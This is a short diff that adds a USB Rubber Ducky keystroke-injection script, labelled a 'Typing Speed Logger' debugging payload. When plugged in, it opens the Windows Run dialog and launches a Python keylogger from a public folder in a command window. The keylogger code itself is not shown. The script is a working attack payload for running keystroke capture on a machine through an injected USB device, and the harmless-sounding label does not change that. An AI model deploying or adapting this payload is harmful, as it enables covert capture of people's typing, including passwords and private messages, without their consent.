@@ -1,0 +1,12 @@
+REM =============================================
+REM  Typing Speed Logger - VERBOSE Ducky Payload
+REM  Opens a visible CMD window and runs the
+REM  verbose keylogger for testing/debugging
+REM =============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING cmd /k python C:\Users\Public\keylogger_verbose.py
+ENTER
